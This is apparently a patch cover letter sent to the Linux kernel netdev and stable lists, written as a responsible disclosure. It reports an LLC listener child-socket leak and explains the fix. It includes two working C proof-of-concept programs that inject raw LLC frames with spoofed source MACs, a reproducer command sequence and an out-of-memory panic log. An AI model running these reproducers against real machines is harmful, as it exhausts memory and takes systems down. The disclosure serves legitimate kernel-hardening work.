Received: from mail-pl1-f180.google.com (mail-pl1-f180.google.com [209.85.214.180])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 9580C38AC92
	for <stable@vger.kernel.org>; Thu,  3 Sep 2026 08:01:39 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.214.180
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1788422501; cv=none; b=cNzkO21U2bVOEO9np+Pfs8BWDyEzBuCgXmfLQw/dySOvjq7Xq6/86fY0raiGmpxvnqHuTNsjRjNZadrvGOb9wixg5kHaIfuKgCkEfs0dHArTCv87WKfE8Q2sbrqt9TREZmdjJkGw5W8f7bmH1KYWl1hMlS9dRLVUk7+jsPfJOLw=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1788422501; c=relaxed/simple;
	bh=aISvUzaphZ9FaUBfYsCwahaL6XMhh1apJ7ObdBDl7i4=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=Ul2KWE2VwXkGYQOJNbtuGQQFutprs82QgjfXXJyIoEjxWZDZROp0Hsgq3jR/6R7lvqQci2neHg+zVLw7zkzZR7GG+yGnFa0ZbpzsWQ+uelFGHhbfiday9WGdVSvfM6SCkb1ysHMYEoNVywZC2q12Y2hW7o1wr0RZFfSQXMFPyJE=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=clI5VsJb; arc=none smtp.client-ip=209.85.214.180
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="clI5VsJb"
Received: by mail-pl1-f180.google.com with SMTP id d9443c01a7336-2d5335cf904so19773865ad.2
        for <stable@vger.kernel.org>; Thu, 03 Sep 2026 01:01:39 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1788422499; x=1789027299; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=WvoZQ9wre/wiIXCjMkNMmaYfAjY6Ihba2WKQdi395nM=;
        b=clI5VsJb32Sc74t/CJv1q1K2NzwrMvZoGPXZ61vLfE34OocX4yIPTIcb53Gmu8U6ve
         3Op3ViyxnWR3LjAUGPc3SfYsF8ADZO+F9Ck6bhmPBWGvIhDCpJCXoPzetaN4KQMT3SBR
         +meUwvRnD+F+3iWxLWezRYaLCASyLxDdO5rdyQjvct8Jw66mpdCXwWah4CPzLLZkCJqp
         ftPM1eQKlvagMBrrkfaMGk5oK+hKSTXF8cxTj81mrV6o7i4sOvIi+Z2e5BkTBVcOUk8N
         XQ1c8mMv/z97dmPz3ng+Q3UEeKm4goyLm8L/VOUMv0NRpfi3tFO3uaTxRTaHorGd6XJN
         PRZA==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1788422499; x=1789027299;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=WvoZQ9wre/wiIXCjMkNMmaYfAjY6Ihba2WKQdi395nM=;
        b=RJ/WOEgrPQQ2iPG/TAKOfNWCgTanXHeUThrDgK1QuEb+Jr/3DVatcFOGLVqk/Wg4ij
         fSasr48AnEXMrcg+9otoJmz3k/0OT+TkW0NPIb8/5yMvaNM3TtIsCPS9zAZ8i3bAmjTp
         vWKFUR7OvNUN4dVNBz8fnpfdkJKGNTzC2wOVIkqFLe2zv4LoFSjbsqC9eJvhxlp1hGD7
         BGZV3gVtV3J5E2PJPUObiHITa9p92pJ+4KAGQnfHTbySHCVfj5qzrnnEyDlGiEilTIqo
         q6ZX0NOKO8EXQ6zLvrVBEDULxJxM9mRSzyzG9Qv+ji8GxsMwgA8kFczFeov2C/tgHNN4
         4hkA==
X-Forwarded-Encrypted: i=1; AKwUvBwnpTdoUdiCMqAnqDtiT9pujvSrIN6QvWnxZvE8yYD48IVq5cMQ5IIb3krFH+OS4VkBejzZ2o4=@vger.kernel.org
X-Gm-Message-State: AFuF++mOsqXB4Suv9n9fqxZh74YB5QpJ3RL7iqHobT2nLFOXlQ8Vzq+h
	ruyhSk81K/qjnPCRSYg0ZTMRqN64SHsGdz7ORtzpGdfuIOnyX4iICDyFhB81n/gGnfbx
X-Gm-Gg: AYBFou2EBcPsOT/rnGUOVfD2diteiSGWTEbDGfMQnaAnSjEAsWFlHsvfgZB5ZibVFcU
	TyzyFENLU4S5+i5IBwVuH51otZgcbOCopJN0V+/6M/7CzfJr0bsrzbr6v487fBm22IWVMM62Tpo
	4ucwYfe/1lzn2BCfNdT78DPlFnzs+FSdzIvoR0fZoRFBnjbwWP2alhCBWm/yILtsDysj45db59r
	n1irFhR4ne7YqXzc1F/OsLdek0SjOrln5VTOJrPDk1YND6VYsT4KYrbrN8yt/nlmBMCWiIMGfDd
	eQhiP+ijgbSHwPuRAMstwxQcq4vZp2btC/NzdEKTo/vrB0fT3Umf6CLlUvS6v1GunqmF5J8aMta
	wT84KEfeuy+GQnurhrJQQ6fN7bxluvWYMGL7aNRyhCmNCrheNQjBxoZuSU03guXmnC+1OyJtUX9
	4LBF8B82Wq2q37Ft++Juiy0a/b9AJm7vUu+/APWZCVMQ7MmT6dkl5hFgHxxv+dY0+h2La23cfED
	aMmTpfv6z2u0wNsY/pOoxoPE8XRdQ==
X-Received: by 2002:a17:903:3c66:b0:2d8:d4cc:be64 with SMTP id d9443c01a7336-2daec73208cmr168726045ad.17.1788422498298;
        Thu, 03 Sep 2026 01:01:38 -0700 (PDT)
Received: from b6ad5085b32f.. ([122.51.212.64])
        by smtp.gmail.com with ESMTPSA id d9443c01a7336-2dafe0d062fsm6240295ad.5.2026.09.03.01.01.32
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Thu, 03 Sep 2026 01:01:36 -0700 (PDT)
From: Zihan Xi <zihanx@nebusec.ai>
To: netdev@vger.kernel.org
Cc: "David S . Miller" <davem@davemloft.net>,
	Eric Dumazet <edumazet@google.com>,
	Jakub Kicinski <kuba@kernel.org>,
	Paolo Abeni <pabeni@redhat.com>,
	Simon Horman <horms@kernel.org>,
	Kees Cook <kees@kernel.org>,
	linux-kernel@vger.kernel.org,
	stable@vger.kernel.org,
	Vega <vega@nebusec.ai>
Subject: [PATCH net v7 0/1] llc: fix listener child socket leaks before passive open completes
Date: Thu,  3 Sep 2026 08:01:23 +0000
Message-ID: <cover.1788414881.git.zihanx@nebusec.ai>
X-Mailer: git-send-email 2.47.3
Precedence: bulk
X-Mailing-List: stable@vger.kernel.org
List-Id: <stable.vger.kernel.org>
List-Subscribe: <mailto:stable+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:stable+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi Linux kernel maintainers,

We found and validated an issue in net/llc/llc_conn.c. The reproducer needs
CAP_NET_RAW and CAP_NET_ADMIN in init_net.
We've tested it, and it should not affect any other functionality.

We will provide detailed information about the bug
in this email, along with a PoC to trigger it.

---- details below ----

Bug details:

llc_conn_handler() creates a passive-open child for every frame matched by an
LLC listener. The child is immediately inserted in the SAP tables and takes a
device reference, before the LLC state machine proves that the frame is a real
passive open and before LLC_CONN_PRIM makes it available to accept().

A non-SABME frame never reaches that indication. The old path therefore leaves
a published child behind which accept() cannot return. The same lifecycle gap
also remains for SABME traffic when direct processing, backlog enqueue, or
backlog processing exits before LLC_CONN_PRIM, and when a listener is closed
with queued but unaccepted children.

The crash PoC is the DISC path only: a PF_LLC SOCK_STREAM listener plus
injected DISC commands, each with a unique source MAC. On the original
unfixed kernel, 100 such frames left 100 leftover entries in
/proc/net/llc/socket after the listener process exited, and deleting the
listener interface then stalled in unregister_netdevice because those
children still held the device. Repeating that traffic until the 2 GB
guest is exhausted is what produces the panic_on_oom log below. That
stack is out_of_memory() from a later page fault in the PoC process; it
does not contain llc_conn_handler().

SABME is a legitimate passive open and is not the crash trigger.
poc-sabme.c exercises the extra lifecycle paths that share the same
child publication gap: accept() after SABME, and close() of the listener
without accept().

The fix creates children only for SABME commands. DISC and other commands that
need an ADM-state DM reply are answered directly from the listener using the
packet source address, while other non-SABME traffic is dropped without driving
the listener state machine.

For SABME, the child remains in the SAP tables during passive open so tuple
lookup continues to win over the listener. The patch tracks children through
pending and queued states, routes packets for a pending child through the
listener-side handshake, and removes any child that has not been accepted when
a failure, backlog drop, or listener close occurs. Cleanup is not gated on the
current TCP state, so children are also released if the socket leaves
TCP_LISTEN before close. Redirected packets that observe SOCK_DEAD on the
listener also release the pending child in llc_conn_handler(), so that path
does not depend only on close() draining the backlog. A redirected frame
that fails to enqueue on the listener backlog is dropped without tearing
down the already pending child. close() walks the listener's remaining
incoming children after draining sk_receive_queue, so PENDING sockets
that never reached the accept queue are still released. Handshake skbs
keep a child socket reference with skb_set_owner_sk_safe(), so
kfree_skb() on drop, accept-failure, and close paths cannot race the
asynchronous teardown destructor. Process-context child-lock acquisition
is serialized with bottom halves disabled. Final child destruction is
deferred to process context so its timers can be synchronized safely,
and that work does not lock the listener. The work orphans the child and
drops the device reference before llc_sk_free().

The root-cause fact fixed here predates d389424e00f9. Its parent already
creates a listener-side child, publishes it to the SAP tables before
LLC_CONN_PRIM, and has no rollback path if processing exits early. In the local
visible history, the earliest commit where that root-cause fact is already
present is 1da177e4c3f4 ("Linux-2.6.12-rc2"), so Fixes points there.

This revision drops the follow-up LLC_CONN_OUT_OF_SVC bounds patch. Kees
Cook posted a more complete net-next series for that overlap, and review
of v6 2/2 also noted the unlatched state-table index and the possible +1
connect(2) return. The listener child leak remains independent of that
series.

PF_LLC sockets can only be created in init_net and need CAP_NET_RAW.
unshare -Urn is not used, because a user-plus-net namespace rejects
PF_LLC with EAFNOSUPPORT. The reproducer therefore creates a veth pair
and injects AF_PACKET frames in init_net.

The reproducer writes panic_on_oom only to turn the final memory
exhaustion into stable crash evidence after leftover LLC sockets are
already visible in /proc/net/llc/socket. It is not a prerequisite for
the leak itself.

packetdrill was not used here because the trigger depends on combining a PF_LLC
listening socket with raw AF_PACKET injection over a veth pair while rotating
the source MAC address to force distinct passive-open children. The PoC is
centered on that listener-plus-raw-packet resource leak path rather than on a
packetdrill-friendly timing script.

Reproducer:

    gcc -O2 -static -o poc poc.c
    gcc -O2 -static -o poc-sabme poc-sabme.c
    ip link add llc_rx0 type veth peer name llc_tx0
    ip link set llc_rx0 address 02:11:22:33:44:55
    ip link set llc_tx0 address 02:11:22:33:44:66
    ip link set llc_rx0 up
    ip link set llc_tx0 up
    ./poc llc_rx0 llc_tx0 110000

The crash command above is the DISC injector. The extra SABME paths are:

    ./poc-sabme accept llc_rx0 llc_tx0
    ./poc-sabme close llc_rx0 llc_tx0 100

For deterministic crash evidence only, after leftover LLC sockets are
already visible in /proc/net/llc/socket, we additionally set:

    echo 2 > /proc/sys/vm/panic_on_oom

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN poc.c------
#define _GNU_SOURCE

#include <arpa/inet.h>
#include <errno.h>
#include <linux/if_arp.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <linux/if.h>
#include <linux/llc.h>
#include <net/ethernet.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

#ifndef AF_LLC
#define AF_LLC 26
#endif

#define DEFAULT_RX_IF "llc_rx0"
#define DEFAULT_TX_IF "llc_tx0"
#define DEFAULT_SAP 0xc0
#define DEFAULT_REPORT_EVERY 10000ULL

static void die_errno(const char *what)
{
	perror(what);
	exit(EXIT_FAILURE);
}

static void usage(const char *prog)
{
	fprintf(stderr,
		"usage: %s [rx_if] [tx_if] [count]\n"
		"  rx_if: LLC listener interface (default: %s)\n"
		"  tx_if: raw packet sender interface (default: %s)\n"
		"  count: number of DISC frames to send, 0 means forever\n",
		prog, DEFAULT_RX_IF, DEFAULT_TX_IF);
}

static void get_if_hwaddr(const char *ifname, unsigned char mac[ETH_ALEN])
{
	struct ifreq ifr;
	int fd;

	fd = socket(AF_INET, SOCK_DGRAM, 0);
	if (fd < 0)
		die_errno("socket(AF_INET)");

	memset(&ifr, 0, sizeof(ifr));
	snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "%s", ifname);
	if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0)
		die_errno("ioctl(SIOCGIFHWADDR)");

	memcpy(mac, ifr.ifr_hwaddr.sa_data, ETH_ALEN);
	close(fd);
}

static int get_ifindex(const char *ifname)
{
	struct ifreq ifr;
	int fd;

	fd = socket(AF_INET, SOCK_DGRAM, 0);
	if (fd < 0)
		die_errno("socket(AF_INET)");

	memset(&ifr, 0, sizeof(ifr));
	snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "%s", ifname);
	if (ioctl(fd, SIOCGIFINDEX, &ifr) < 0)
		die_errno("ioctl(SIOCGIFINDEX)");

	close(fd);
	return ifr.ifr_ifindex;
}

static int make_listener(const char *ifname, uint8_t sap, unsigned char mac[ETH_ALEN])
{
	struct sockaddr_llc addr;
	int fd;

	fd = socket(AF_LLC, SOCK_STREAM, 0);
	if (fd < 0)
		die_errno("socket(AF_LLC)");

	get_if_hwaddr(ifname, mac);

	memset(&addr, 0, sizeof(addr));
	addr.sllc_family = AF_LLC;
	addr.sllc_arphrd = ARPHRD_ETHER;
	addr.sllc_sap = sap;
	memcpy(addr.sllc_mac, mac, ETH_ALEN);

	if (bind(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0)
		die_errno("bind(AF_LLC)");
	if (listen(fd, 16) < 0)
		die_errno("listen(AF_LLC)");

	return fd;
}

static int make_packet_socket(const char *ifname, int *ifindex_out)
{
	struct sockaddr_ll sll;
	int fd;
	int one = 1;
	int ifindex = get_ifindex(ifname);

	fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
	if (fd < 0)
		die_errno("socket(AF_PACKET)");

	setsockopt(fd, SOL_PACKET, PACKET_QDISC_BYPASS, &one, sizeof(one));

	memset(&sll, 0, sizeof(sll));
	sll.sll_family = AF_PACKET;
	sll.sll_protocol = htons(ETH_P_ALL);
	sll.sll_ifindex = ifindex;

	if (bind(fd, (struct sockaddr *)&sll, sizeof(sll)) < 0)
		die_errno("bind(AF_PACKET)");

	*ifindex_out = ifindex;
	return fd;
}

static void fill_src_mac(unsigned char mac[ETH_ALEN], uint64_t n)
{
	mac[0] = 0x02;
	mac[1] = (n >> 32) & 0xff;
	mac[2] = (n >> 24) & 0xff;
	mac[3] = (n >> 16) & 0xff;
	mac[4] = (n >> 8) & 0xff;
	mac[5] = n & 0xff;
}

int main(int argc, char **argv)
{
	static unsigned char frame[ETH_ZLEN];
	unsigned char dst_mac[ETH_ALEN];
	unsigned char src_mac[ETH_ALEN];
	struct sockaddr_ll sll;
	const char *rx_if = DEFAULT_RX_IF;
	const char *tx_if = DEFAULT_TX_IF;
	uint64_t count = 0;
	uint64_t i = 1;
	int listener_fd;
	int packet_fd;
	int ifindex;

	if (argc > 1 && (!strcmp(argv[1], "-h") || !strcmp(argv[1], "--help"))) {
		usage(argv[0]);
		return 0;
	}
	if (argc > 1)
		rx_if = argv[1];
	if (argc > 2)
		tx_if = argv[2];
	if (argc > 3) {
		char *end = NULL;

		errno = 0;
		count = strtoull(argv[3], &end, 0);
		if (errno || !end || *end != '\0') {
			fprintf(stderr, "invalid count: %s\n", argv[3]);
			return EXIT_FAILURE;
		}
	}
	if (argc > 4) {
		usage(argv[0]);
		return EXIT_FAILURE;
	}

	listener_fd = make_listener(rx_if, DEFAULT_SAP, dst_mac);
	packet_fd = make_packet_socket(tx_if, &ifindex);

	memset(frame, 0, sizeof(frame));
	memcpy(frame, dst_mac, ETH_ALEN);
	((struct ethhdr *)frame)->h_proto = htons(3);
	frame[ETH_HLEN + 0] = DEFAULT_SAP;
	frame[ETH_HLEN + 1] = 0x04;
	frame[ETH_HLEN + 2] = 0x43; /* DISC command, P/F=0 */

	memset(&sll, 0, sizeof(sll));
	sll.sll_family = AF_PACKET;
	sll.sll_ifindex = ifindex;
	sll.sll_halen = ETH_ALEN;
	memcpy(sll.sll_addr, dst_mac, ETH_ALEN);

	fprintf(stderr,
		"listener_if=%s sender_if=%s sap=0x%02x count=%s\n",
		rx_if, tx_if, DEFAULT_SAP, count ? argv[3] : "0");
	fprintf(stderr,
		"listener_mac=%02x:%02x:%02x:%02x:%02x:%02x\n",
		dst_mac[0], dst_mac[1], dst_mac[2],
		dst_mac[3], dst_mac[4], dst_mac[5]);
	fprintf(stderr,
		"sending LLC DISC commands with a unique spoofed source MAC each time\n");

	while (!count || i <= count) {
		fill_src_mac(src_mac, i);
		if (!memcmp(src_mac, dst_mac, ETH_ALEN))
			src_mac[ETH_ALEN - 1] ^= 1;
		memcpy(frame + ETH_ALEN, src_mac, ETH_ALEN);

		if (sendto(packet_fd, frame, sizeof(frame), 0,
			   (struct sockaddr *)&sll, sizeof(sll)) < 0)
			die_errno("sendto(AF_PACKET)");

		if (!(i % DEFAULT_REPORT_EVERY))
			fprintf(stderr, "sent=%llu\n",
				(unsigned long long)i);
		i++;
	}

	close(packet_fd);
	close(listener_fd);
	return 0;
}
------END poc.c--------

------BEGIN poc-sabme.c------
#define _GNU_SOURCE

#include <arpa/inet.h>
#include <errno.h>
#include <linux/if.h>
#include <linux/if_arp.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <linux/llc.h>
#include <net/ethernet.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <sys/types.h>
#include <unistd.h>

#ifndef AF_LLC
#define AF_LLC 26
#endif

#define DEFAULT_RX_IF "llc_rx0"
#define DEFAULT_TX_IF "llc_tx0"
#define DEFAULT_SAP 0xc0
#define SABME_CMD 0x6f

static void die_errno(const char *what)
{
	perror(what);
	exit(EXIT_FAILURE);
}

static void get_if_hwaddr(const char *ifname, unsigned char mac[ETH_ALEN])
{
	struct ifreq ifr;
	int fd = socket(AF_INET, SOCK_DGRAM, 0);

	if (fd < 0)
		die_errno("socket(AF_INET)");
	memset(&ifr, 0, sizeof(ifr));
	snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "%s", ifname);
	if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0)
		die_errno("ioctl(SIOCGIFHWADDR)");
	memcpy(mac, ifr.ifr_hwaddr.sa_data, ETH_ALEN);
	close(fd);
}

static int get_ifindex(const char *ifname)
{
	struct ifreq ifr;
	int fd = socket(AF_INET, SOCK_DGRAM, 0);

	if (fd < 0)
		die_errno("socket(AF_INET)");
	memset(&ifr, 0, sizeof(ifr));
	snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "%s", ifname);
	if (ioctl(fd, SIOCGIFINDEX, &ifr) < 0)
		die_errno("ioctl(SIOCGIFINDEX)");
	close(fd);
	return ifr.ifr_ifindex;
}

static int make_listener(const char *ifname, uint8_t sap, unsigned char mac[ETH_ALEN])
{
	struct sockaddr_llc addr;
	int fd = socket(AF_LLC, SOCK_STREAM, 0);

	if (fd < 0)
		die_errno("socket(AF_LLC)");
	get_if_hwaddr(ifname, mac);
	memset(&addr, 0, sizeof(addr));
	addr.sllc_family = AF_LLC;
	addr.sllc_arphrd = ARPHRD_ETHER;
	addr.sllc_sap = sap;
	memcpy(addr.sllc_mac, mac, ETH_ALEN);
	if (bind(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0)
		die_errno("bind(AF_LLC)");
	if (listen(fd, 16) < 0)
		die_errno("listen(AF_LLC)");
	return fd;
}

static int make_packet_socket(const char *ifname, int *ifindex_out)
{
	struct sockaddr_ll sll;
	int one = 1;
	int ifindex = get_ifindex(ifname);
	int fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));

	if (fd < 0)
		die_errno("socket(AF_PACKET)");
	setsockopt(fd, SOL_PACKET, PACKET_QDISC_BYPASS, &one, sizeof(one));
	memset(&sll, 0, sizeof(sll));
	sll.sll_family = AF_PACKET;
	sll.sll_protocol = htons(ETH_P_ALL);
	sll.sll_ifindex = ifindex;
	if (bind(fd, (struct sockaddr *)&sll, sizeof(sll)) < 0)
		die_errno("bind(AF_PACKET)");
	*ifindex_out = ifindex;
	return fd;
}

static void fill_src_mac(unsigned char mac[ETH_ALEN], uint64_t n)
{
	mac[0] = 0x02;
	mac[1] = (n >> 32) & 0xff;
	mac[2] = (n >> 24) & 0xff;
	mac[3] = (n >> 16) & 0xff;
	mac[4] = (n >> 8) & 0xff;
	mac[5] = n & 0xff;
}

static void send_sabme(int packet_fd, int ifindex, const unsigned char dst[ETH_ALEN],
		       const unsigned char src[ETH_ALEN])
{
	static unsigned char frame[ETH_ZLEN];
	struct sockaddr_ll sll;

	memset(frame, 0, sizeof(frame));
	memcpy(frame, dst, ETH_ALEN);
	memcpy(frame + ETH_ALEN, src, ETH_ALEN);
	((struct ethhdr *)frame)->h_proto = htons(3);
	frame[ETH_HLEN + 0] = DEFAULT_SAP;
	frame[ETH_HLEN + 1] = 0x04;
	frame[ETH_HLEN + 2] = SABME_CMD;
	memset(&sll, 0, sizeof(sll));
	sll.sll_family = AF_PACKET;
	sll.sll_ifindex = ifindex;
	sll.sll_halen = ETH_ALEN;
	memcpy(sll.sll_addr, dst, ETH_ALEN);
	if (sendto(packet_fd, frame, sizeof(frame), 0,
		   (struct sockaddr *)&sll, sizeof(sll)) < 0)
		die_errno("sendto(AF_PACKET)");
}

static void usage(const char *prog)
{
	fprintf(stderr, "usage: %s accept|close [rx_if] [tx_if] [count]\n", prog);
}

int main(int argc, char **argv)
{
	unsigned char dst_mac[ETH_ALEN];
	unsigned char src_mac[ETH_ALEN];
	const char *mode;
	const char *rx_if = DEFAULT_RX_IF;
	const char *tx_if = DEFAULT_TX_IF;
	uint64_t count = 1;
	uint64_t i;
	int listener_fd;
	int packet_fd;
	int ifindex;

	if (argc < 2) {
		usage(argv[0]);
		return EXIT_FAILURE;
	}
	mode = argv[1];
	if (argc > 2)
		rx_if = argv[2];
	if (argc > 3)
		tx_if = argv[3];
	if (argc > 4) {
		char *end = NULL;

		errno = 0;
		count = strtoull(argv[4], &end, 0);
		if (errno || !end || *end != '\0' || !count) {
			fprintf(stderr, "invalid count: %s\n", argv[4]);
			return EXIT_FAILURE;
		}
	}

	listener_fd = make_listener(rx_if, DEFAULT_SAP, dst_mac);
	packet_fd = make_packet_socket(tx_if, &ifindex);
	fprintf(stderr, "mode=%s listener_if=%s sender_if=%s count=%llu\n",
		mode, rx_if, tx_if, (unsigned long long)count);

	if (!strcmp(mode, "accept")) {
		int child;
		struct sockaddr_llc addr;
		socklen_t addrlen = sizeof(addr);
		struct timeval tv = { .tv_sec = 5, .tv_usec = 0 };

		fill_src_mac(src_mac, 1);
		if (!memcmp(src_mac, dst_mac, ETH_ALEN))
			src_mac[ETH_ALEN - 1] ^= 1;
		send_sabme(packet_fd, ifindex, dst_mac, src_mac);
		setsockopt(listener_fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
		child = accept(listener_fd, (struct sockaddr *)&addr, &addrlen);
		if (child < 0)
			die_errno("accept(AF_LLC)");
		printf("SABME passive open accepted\naccept_rc=0\n");
		close(child);
		close(packet_fd);
		close(listener_fd);
		return 0;
	}

	if (!strcmp(mode, "close")) {
		for (i = 1; i <= count; i++) {
			fill_src_mac(src_mac, i);
			if (!memcmp(src_mac, dst_mac, ETH_ALEN))
				src_mac[ETH_ALEN - 1] ^= 1;
			send_sabme(packet_fd, ifindex, dst_mac, src_mac);
		}
		close(packet_fd);
		close(listener_fd);
		printf("SABME sent without accept and listener closed\n");
		return 0;
	}

	usage(argv[0]);
	return EXIT_FAILURE;
}
------END poc-sabme.c--------

------BEGIN leak sample------
Original leak-only run on the unfixed kernel, 100 DISC frames, after the
listener process had already exited:

before: 0 leftover LLC sockets
after 100 frames: 100 leftover entries remained in /proc/net/llc/socket

Deleting the listener interface then stalled in unregister_netdevice
because those children still held the device. The panic_on_oom log below
is the later 110000-frame exhaustion of the 2 GB guest, not the leak
oracle itself.
------END leak sample--------

----BEGIN crash log----
[ 1665.704541][T10284] Kernel panic - not syncing: Out of memory: compulsory panic_on_oom is enabled

[ 1665.705358][T10284] CPU: 0 UID: 0 PID: 10284 Comm: poc Not tainted 6.12.74 #3

[ 1665.705911][T10284] Hardware name: QEMU Ubuntu 24.04 PC (i440FX + PIIX, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014

[ 1665.706676][T10284] Call Trace:

[ 1665.706943][T10284]  <TASK>

[1665.707181][T10284] dump_stack_lvl (lib/dump_stack.c:105 (discriminator 2))

[1665.707568][T10284] panic (kernel/panic.c:339 (discriminator 1))

[1665.707918][T10284] ? dump_header (include/linux/rcupdate.h:815 (discriminator 1) mm/oom_kill.c:455 (discriminator 1) mm/oom_kill.c:478 (discriminator 1))

[1665.708305][T10284] ? __pfx_panic (kernel/panic.c:277)

[ 1665.708678][T10284]  ? srso_alias_return_thunk+0x5/0xfbef5

[ 1665.709132][T10284]  ? srso_alias_return_thunk+0x5/0xfbef5

[ 1665.709616][T10284]  ? out_of_memory+0x8c5/0x16b0

[ 1665.710024][T10284]  out_of_memory+0x8f3/0x16b0

[ 1665.710435][T10284]  ? __pfx_out_of_memory+0x10/0x10

[ 1665.710868][T10284]  ? lock_acquire+0x2f/0xb0

[ 1665.711243][T10284]  ? __alloc_pages_noprof+0xd59/0x26d0

[ 1665.711712][T10284]  __alloc_pages_noprof+0x1ec3/0x26d0

[ 1665.712184][T10284]  ? srso_alias_return_thunk+0x5/0xfbef5

[ 1665.712658][T10284]  ? hlock_class+0x4e/0x130

[ 1665.713041][T10284]  ? srso_alias_return_thunk+0x5/0xfbef5

[ 1665.713501][T10284]  ? __pfx___alloc_pages_noprof+0x10/0x10

[ 1665.713991][T10284]  ? __pfx___lock_acquire+0x10/0x10

[ 1665.714431][T10284]  ? __sanitizer_cov_trace_switch+0x54/0x90

[ 1665.714917][T10284]  ? srso_alias_return_thunk+0x5/0xfbef5

[ 1665.715381][T10284]  ? policy_nodemask+0xf2/0x4f0

[ 1665.715788][T10284]  alloc_pages_mpol_noprof+0x2ce/0x610

[ 1665.716246][T10284]  ? __pfx_alloc_pages_mpol_noprof+0x10/0x10

[ 1665.716734][T10284]  ? srso_alias_return_thunk+0x5/0xfbef5

[ 1665.717194][T10284]  ? srso_alias_return_thunk+0x5/0xfbef5

[ 1665.717656][T10284]  ? xas_load+0x49/0x5b0

[ 1665.718005][T10284]  ? filemap_get_entry+0xd5/0x3c0

[ 1665.718439][T10284]  folio_alloc_noprof+0x23/0xd0

[ 1665.718847][T10284]  filemap_alloc_folio_noprof+0x35d/0x420

[ 1665.719316][T10284]  ? __pfx_filemap_alloc_folio_noprof+0x10/0x10

[ 1665.719803][T10284]  ? filemap_fault+0x631/0x2800

[ 1665.720231][T10284]  __filemap_get_folio+0x53e/0xaf0

[ 1665.720683][T10284]  filemap_fault+0x675/0x2800

[ 1665.721097][T10284]  ? __pfx_filemap_fault+0x10/0x10

[ 1665.721534][T10284]  ? do_pte_missing+0x165a/0x3ff0

[ 1665.721944][T10284]  ? __pfx_lock_release+0x10/0x10

[ 1665.722375][T10284]  ? __pfx_filemap_map_pages+0x10/0x10

[ 1665.722813][T10284]  __do_fault+0x10f/0x4a0

[ 1665.723172][T10284]  ? __pfx_filemap_map_pages+0x10/0x10

[ 1665.723621][T10284]  do_pte_missing+0x174c/0x3ff0

[ 1665.724026][T10284]  ? srso_alias_return_thunk+0x5/0xfbef5

[ 1665.724482][T10284]  ? reacquire_held_locks+0x20b/0x4c0

[ 1665.724932][T10284]  ? lock_vma_under_rcu+0x143/0x980

[ 1665.725374][T10284]  __handle_mm_fault+0xfa3/0x2a10

[ 1665.725805][T10284]  ? __pfx_lock_release+0x10/0x10

[ 1665.726207][T10284]  ? down_read_trylock+0x1f0/0x3f0

[ 1665.726640][T10284]  ? __pfx___handle_mm_fault+0x10/0x10

[ 1665.727085][T10284]  ? __pfx_down_read_trylock+0x10/0x10

[ 1665.727574][T10284]  ? __pfx_lock_vma_under_rcu+0x10/0x10

[ 1665.728053][T10284]  handle_mm_fault+0x3f5/0xa00

[ 1665.728479][T10284]  do_user_addr_fault+0x50a/0x1490

[ 1665.728921][T10284]  exc_page_fault+0x5d/0xe0

[ 1665.729305][T10284]  asm_exc_page_fault+0x26/0x30

[ 1665.729700][T10284] RIP: 0033:0x559e433ce5cb

[ 1665.730065][T10284] Code: Unable to access opcode bytes at 0x559e433ce5a1.

[ 1665.730594][T10284] RSP: 002b:00007ffcc17c93f0 EFLAGS: 00010206

[ 1665.731148][T10284] RAX: 000000000000003c RBX: 00007ffcc17c9418 RCX: 0000559e433d10c6

[ 1665.731733][T10284] RDX: 000000000000002c RSI: 0000559e433d10c0 RDI: 0000000000000004

